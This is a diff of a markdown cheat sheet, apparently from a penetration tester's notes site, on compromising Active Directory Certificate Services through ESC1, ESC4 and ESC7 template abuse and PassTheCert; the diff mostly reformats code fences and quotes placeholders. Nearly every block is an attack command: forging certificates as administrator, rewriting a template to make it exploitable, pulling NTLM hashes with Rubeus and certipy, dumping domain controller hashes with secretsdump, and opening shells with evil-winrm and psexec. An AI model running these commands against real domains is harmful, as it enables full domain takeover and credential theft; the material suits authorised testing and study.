@@ -4,7 +4,6 @@ date: 2024-7-23
 tags: ["certificate services", "active driectory", "ad", "Windows", "certify", "adcs", "esc", "PassTheCert"]
 ---
 
----
 ### Enum (From Linux)
 
 {{< tab set1 tab1 active >}}certipy-ad{{< /tab >}}
@@ -13,8 +12,8 @@ tags: ["certificate services", "active driectory", "ad", "Windows", "certify", "
 
 <div>
 
-```bash
-certipy-ad find -u <USER> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerable
+```console
+certipy-ad find -u <USER> -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable
 ```
 
 </div>
@@ -24,8 +23,8 @@ certipy-ad find -u <USER> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerab
 
 <div>
 
-```bash
-nxc ldap <TARGET> -u <USER> -p <PASSWORD> -M adcs
+```console
+nxc ldap <TARGET> -u <USER> -p '<PASSWORD>' -M adcs
 ```
 
 </div>
@@ -41,17 +40,17 @@ nxc ldap <TARGET> -u <USER> -p <PASSWORD> -M adcs
 
 <div>
 
-```powershell
+```console
 # Check ADCS service
 net start | findstr /i cert
 ```
 
-```powershell
+```console
 # Check env
 certutil
 ```
 
-```powershell
+```console
 # List cert templates
 certutil -catemplates
 ```
@@ -63,12 +62,12 @@ certutil -catemplates
 
 <div>
 
-```powershell
+```console
 # Get info of each template
 .\certify.exe find
 ```
 
-```powershell
+```console
 # Find vuln templates
 .\certify.exe find /vulnerable /currentuser
 ```
@@ -80,11 +79,11 @@ certutil -catemplates
 
 <div>
 
-```powershell
+```console
 import-module .\ADCSTemplate.psm1
 ```
 
-```powershell
+```console
 get-adcstemplate | fl displayname
 ```
 
@@ -105,16 +104,16 @@ get-adcstemplate | fl displayname
 
 <div>
 
-```powershell
+```console
 .\certify.exe request /ca:<CONFIG> /template:User
 ```
 
-```powershell
+```console
 # Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
 ```
 
-```powershell
+```console
 # Get NTLM hash
 .\rubeus.exe asktgt /user:<USER> /certificate:cert.pfx /getcredentials /show /nowrap
 ```
@@ -131,7 +130,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 
 <div>
 
-```
+```console
 +----------------------------------------------------------+
 | Enabled                        : True                    |
 | Client Authentication          : True                    |
@@ -151,30 +150,30 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
-```powershell
+```console
 . .\ADCS.ps1
 ```
 
-```powershell
+```console
 # Add smartcart logon
 Get-SmartCardCertificate -Identity Administrator -TemplateName <VULN_TEMPLATE> -NoSmartCard -Verbose
 ```
 
-```powershell
+```console
 # Get Cert_Thumbprint
 Get-ChildItem cert:\currentuser\my -recurse
 ```
 
-```powershell
+```console
 # Get NTLM hash
-.\rubeus.exe asktgt /user:Administrator /certificate:<Thumbprint> /getcredentials /show /nowrap
+.\rubeus.exe asktgt /user:Administrator /certificate:<THUMBPRINT> /getcredentials /show /nowrap
 ```
 
-```bash
+```console
 # Remote
 impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 ```
@@ -190,38 +189,38 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 {{< tab set5 tab1 active >}}Linux{{< /tab >}}
 {{< tab set5 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set5 tab1 >}}
-```bash
+```console
 # Generate Cert with altname
-certipy-ad req -u <USER> -p <PASSWORD> -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template <VULN_TEMPLATE>
+certipy-ad req -u <USER> -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template <VULN_TEMPLATE>
 ```
 
-```bash
+```console
 # Get NTLM hash
 sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
 ```
 
-```bash
+```console
 # Remote
 evil-winrm -i <TARGET> -u administrator -H <HASH>
 ```
 {{< /tabcontent >}}
 {{< tabcontent set5 tab2 >}}
-```powershell
+```console
 # Generate Cert with altname
 .\Certify.exe request /ca:<CA_NAME> /template:<VULN_TEMPLATE> /altname:administrator
 ```
 
-```bash
+```console
 # Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
 ```
 
-```powershell
+```console
 # Get NTLM hash
 .\rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
 ```
 
-```bash
+```console
 # Remote
 evil-winrm -i <TARGET> -u administrator -H <HASH>
 ```
@@ -234,45 +233,45 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 <div>
 
-```powershell
+```console
 import-module .\ADCSTemplate.psm1
 ```
 
-```powershell
+```console
 Export-ADCSTemplate -displayName <VULN_TEMPLATE> > template.json
 ```
 
-```powershell
+```console
 $template = cat template.json -raw | ConvertFrom-Json
 ```
 
-```powershell
+```console
 $template.'msPKI-Certificate-Name-Flag' = 0x1
 ```
 
-```powershell
+```console
 $template | ConvertTo-Json | Set-Content template_mod.json
 ```
 
-```powershell
-New-ADCSTemplate -DisplayName "vuln_esc1" -Publish -JSON (cat template_mod.json -raw)
+```console
+New-ADCSTemplate -DisplayName 'vuln_esc1' -Publish -JSON (cat template_mod.json -raw)
 ```
 
-```powershell
-Set-ADCSTemplateACL -DisplayName "vuln_esc1" -type allow -identity '<DOMAIN>\<USER>' -enroll
+```console
+Set-ADCSTemplateACL -DisplayName 'vuln_esc1' -type allow -identity '<DOMAIN>\<USER>' -enroll
 ```
 
-```bash
+```console
 # Generate Cert with altname
-certipy-ad req -u <USER> -p <PASSWORD> -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template vuln_esc1
+certipy-ad req -u <USER> -p '<PASSWORD>' -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template vuln_esc1
 ```
 
-```bash
+```console
 # Get NTLM hash
 sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
 ```
 
-```bash
+```console
 # Remote
 evil-winrm -i <TARGET> -u administrator -H <HASH>
 ```
@@ -291,7 +290,7 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 <div>
 
-```
+```console
 +---------------------+
 | Access Right        |
 |=====================|
@@ -309,35 +308,35 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 {{< tab set7 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set7 tab1 >}}
 
-```bash
+```console
 # Use ManageCA privilege to add manage certificates permission
-certipy-ad ca -ca <CA_NAME> -add-officer <USER> -u <USER>@<DOMAIN> -p <PASSWORD>
+certipy-ad ca -ca <CA_NAME> -add-officer <USER> -u <USER>@<DOMAIN> -p '<PASSWORD>'
 ```
 
-```bash
+```console
 # Check
-certipy-ad find -dc-ip <DC> -ns <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> -vulnerable -stdout
+certipy-ad find -dc-ip <DC> -ns <DC_IP> -u <USER>@<DOMAIN> -p '<PASSWORD>' -vulnerable -stdout
 ```
 
-```bash
+```console
 # Request Cert based on SubCA (Take note: Request ID)
-certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u <USER>@<DOMAIN> -p <PASSWORD>
+certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u <USER>@<DOMAIN> -p '<PASSWORD>'
 ```
 
-```bash
+```console
 # Issue request using ManageCA and Manage Certificates privilege
-certipy-ad ca -ca <CA_NAME> -issue-request <Request_ID> -u <USER>@<DOMAIN> -p <PASSWORD>
+certipy-ad ca -ca <CA_NAME> -issue-request <REQUEST_ID> -u <USER>@<DOMAIN> -p '<PASSWORD>'
 ```
 
-```bash
-certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -retrieve <Request_ID> -u <USER>@<DOMAIN> -p <PASSWORD>
+```console
+certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -retrieve <REQUEST_ID> -u <USER>@<DOMAIN> -p '<PASSWORD>'
 ```
 
-```bash
+```console
 certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
 ```
 
-```bash
+```console
 # Remote
 evil-winrm -i <TARGET> -u administrator -H <HASH>
 ```
@@ -356,12 +355,12 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 <div>
 
-```bash
+```console
 # Create key from pfx
 certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
 ```
 
-```bash
+```console
 # Create cert from pfx
 certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
 ```
@@ -374,19 +373,19 @@ certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
 
 <div>
 
-```bash
+```console
 # LDAP shell
 python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
 ```
 
-```bash
+```console
 # Add user to administrators group within the ldap shell
 add_user_to_group <USER> administrators
 ```
 
-```bash
+```console
 # Remote
-evil-winrm -i <TARGET_DOMAIN> -u <USER> -p <PASSWORD>
+evil-winrm -i <TARGET_DOMAIN> -u <USER> -p '<PASSWORD>'
 ```
 
 </div>
@@ -396,23 +395,23 @@ evil-winrm -i <TARGET_DOMAIN> -u <USER> -p <PASSWORD>
 
 <div>
 
-```bash
+```console
 python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
 ```
 
-```bash
-sudo ntpdate -s <DC> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<PASSWORD>'
+```console
+sudo ntpdate -s <DC> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<GENERATED_PASSWORD>'
 ```
 
-```bash
+```console
 export KRB5CCNAME=Administrator.ccache
 ```
 
-```bash
-impacket-secretsdump <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-ntlm
+```console
+impacket-secretsdump '<DOMAIN>/administrator@<TARGET_DOMAIN>' -k -no-pass -just-dc-ntlm
 ```
 
-```bash
+```console
 # Remote
 evil-winrm -i <TARGET_DOMAIN> -u administrator -H <HASH>
 ```
